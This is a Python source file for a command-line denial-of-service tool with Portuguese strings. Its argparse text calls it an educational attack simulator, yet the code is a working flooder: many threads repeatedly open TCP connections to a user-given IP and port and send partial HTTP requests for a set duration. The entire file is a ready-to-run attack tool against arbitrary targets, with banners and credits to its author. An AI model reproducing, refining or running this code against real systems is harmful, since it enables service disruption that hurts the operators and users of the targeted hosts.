import socket
import threading
import time
import argparse
import signal
import sys
from colorama import Fore, Style, init

init(autoreset=True)

print(Fore.GREEN + Style.BRIGHT + """
  _____  
 |  __ \ 
 | |  | |
 | |  | |
 | |__| |
 |_____/ 
  ____  
 / __ \ 
| |  | |
| |__| |
 \____/ 
  _____  
 / ____| 
| (___   
 \___ \  
 ____) | 
|_____/ 

Criador:SrJare337""")

print(Fore.BLUE + Style.BRIGHT + "V1.1")
print(Fore.BLUE + Style.BRIGHT + "Srjare337")

parser = argparse.ArgumentParser(description="Simulador de Ataque DoS para fins educacionais")
parser.add_argument("target_ip", help="IP do alvo")
parser.add_argument("target_port", type=int, help="Porta do alvo")
parser.add_argument("--threads", type=int, default=100, help="Número de threads para o ataque")
parser.add_argument("--duration", type=int, default=60, help="Duração do ataque em segundos")

args = parser.parse_args()

def attack(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Define um tempo limite para a conexão
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
            s.close()
        except socket.error:
            continue  # Continue tentando em caso de erro

def start_attack(target_ip, target_port, num_threads, duration):
    print(Fore.GREEN + Style.BRIGHT + f"Iniciando ataque em {target_ip}:{target_port}")
    print(Fore.RED + Style.BRIGHT + f"Número de threads: {num_threads}")
    print(Fore.YELLOW + Style.BRIGHT + f"Duração do ataque: {duration} segundos")
    print(Fore.CYAN + Style.BRIGHT + "⚡ Ataque iniciado! ⚡")

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.daemon = True  # Permite que o thread seja encerrado quando o programa principal terminar
        thread.start()
        threads.append(thread)
        if i % 10 == 0:
            print(Fore.MAGENTA + Style.BRIGHT + f"Thread {i} iniciada...")

    time.sleep(duration)

    # Não é necessário esperar todos os threads terminarem, pois são daemon
    print(Fore.RED + Style.BRIGHT + "Ataque finalizado.")
    print(Fore.CYAN + Style.BRIGHT + "⚠️ Ataque concluído! ⚠️")

def signal_handler(sig, frame):
    print(Fore.YELLOW + Style.BRIGHT + "\nInterrupção recebida! Encerrando o ataque...")
    print(Fore.CYAN + Style.BRIGHT + "bye bye :)")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    start_attack(args.target_ip, args.target_port, args.threads, args.duration)

    print(Fore.GREEN + Style.BRIGHT + "\n---")
    print(Fore.BLUE + Style.BRIGHT + "Créditos: SrJare337")
    print(Fore.BLUE + Style.BRIGHT + "Versão: V1.1")
    print(Fore.GREEN + Style.BRIGHT + "---")
